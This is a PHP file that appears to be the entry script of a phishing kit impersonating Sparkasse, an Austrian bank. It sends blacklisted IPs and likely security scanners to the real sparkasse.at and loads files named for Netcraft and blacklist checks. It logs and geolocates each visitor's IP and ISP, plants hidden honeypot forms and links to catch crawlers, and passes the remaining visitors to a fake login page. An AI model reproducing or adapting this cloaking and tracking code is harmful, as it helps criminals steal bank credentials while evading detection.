<?php
$ip = $_SERVER['REMOTE_ADDR'];

$hash = md5($ip);
$sessionID = strrev($hash);
$_SESSION['auth'] = true;
require 'partial/zero.php';
include 'vendor/100.php';
include 'vendor/200.php';
include 'vendor/300.php';
require_once 'vendor/index.php';
require_once '../remote/500.php';
require 'vendor/netcraft_check.php';
require 'vendor/blacklist_lookup.php';
require('../CONFIG.php');

$filename = '../2617d44145d0300cdf70349b2f3cac79.txt';
$ip_to_search = $_SERVER['REMOTE_ADDR'];

if (false !== strpos(file_get_contents($filename), $ip_to_search)) {

  header("Location: https://href.li/?https://sparkasse.at");
  $line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
  file_put_contents('vendor/one_time_br_prevents.log', $line . PHP_EOL, FILE_APPEND);
  session_destroy();
  die();
} else {
  // otherwise
}



if (file_exists('ht.access')) {
  rename('ht.access', '.htaccess');
}
if (file_exists('vendor/ht.access')) {
  rename('vendor/ht.access', 'vendor/.htaccess');
}

$visitors = fopen('../logs/visits.txt', 'a');
fwrite($visitors, $_SERVER['REMOTE_ADDR'] . "\n");
fclose($visitors);

function url_get_data($url)
{
  $ch = curl_init($url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  $data = curl_exec($ch);
  curl_close($ch);
  return $data;
}

date_default_timezone_set('Europe/London');
$visitor_data = json_decode(url_get_data("https://ipwhois.app/json/$ip"), true);
$visitor_country = $visitor_data['country'];
$visitor_isp = $visitor_data['isp'];
$visitor_info = fopen('../logs/visitors.txt', 'a');
fwrite($visitor_info, "❖ " . $_SERVER['REMOTE_ADDR'] . "=> " . $visitor_country  . " | " . $visitor_isp . " @ " . date("H:i a T") . "\n");
fclose($visitor_info);

session_start();
if ($_SESSION['started'] == true) {
  $_SESSION['started'] == false;
  session_destroy();
  session_regenerate_id();
  unset($_SESSION['started']);
}
header("Location: login.php?user=true");
// $header = "login.php";

//Dwi F.D
?>
<form action="vendor/" method=POST>
  <div style="display:none;">
    <input type=text>
    <button style="display:none" type="submit">Submit button</button>
  </div>
</form>
<noscript>
  <form action="vendor/" method=POST>
    <div style="display:none;">
      <input type=text>
      <button style="display:none" type="submit">Submit button</button>
    </div>
  </form>
</noscript>
<noscript><a rel="nofollow" style="display:none;" href="vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned from the site!</a>
</noscript>
<a rel="nofollow" style="display:none;" href="vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned from the site!</a>
<noscript><a rel="nofollow" style="display:none;" href="vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned from the site!</a>
</noscript>
<a rel="nofollow" style="display:none;" href="vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned from the site!</a>